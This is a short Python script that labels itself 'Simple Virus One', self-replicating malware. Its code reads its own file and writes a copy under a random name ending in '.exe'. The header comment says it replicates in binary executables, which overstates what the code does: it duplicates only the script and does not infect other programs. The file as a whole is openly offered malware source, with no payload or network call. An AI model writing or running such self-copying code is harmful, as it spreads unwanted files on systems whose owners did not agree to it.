# Simple Virus One in Python
# This is a piece of malware which self replicates in Binary Executables

from sys import argv
from random import choice, randint
from string import ascii_letters as Alphabets

# Lambda function to generate a random string of specified length
Randstr = lambda length: "".join([choice(Alphabets) for x in range(length)]) + ".exe"

# Generate a random filename for the replicated executable
File_Name = Randstr(randint(4, 8))

# Get the name of the current script
Self_Script = argv[0]

# Open the current script file in read mode and read its content
with open(Self_Script, "rb") as File:
    Data = File.read()

# Write the read content into the newly created file with the generated filename
with open(File_Name, "wb") as File:
    File.write(Data)
